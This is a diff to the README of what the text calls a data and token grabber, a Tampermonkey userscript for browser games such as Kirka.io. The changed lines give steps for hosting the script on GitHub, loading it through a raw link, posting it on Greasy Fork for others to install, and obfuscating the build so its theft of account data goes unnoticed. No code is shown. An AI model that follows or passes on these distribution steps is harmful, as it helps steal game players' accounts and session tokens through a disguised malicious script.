@@ -23,7 +23,7 @@ Data/token grabber for browser games on js for tampermonkey
 
 4.(Method to post script on greasefork) Upload script to github, make raw txt file and copy link to use loadmethod from this repo and after this post that on greasefork
  
-5.Now to get accounts data you need someone with the included script to log into your account (in Kirka.io only goto website with script)
+5.Now to get accounts data you need someone with the enabled script to log into your account (in Kirka.io only goto website with script)
 
 ### Recommended to obfuscate your PTWline build 
 Websites to obfuscate:
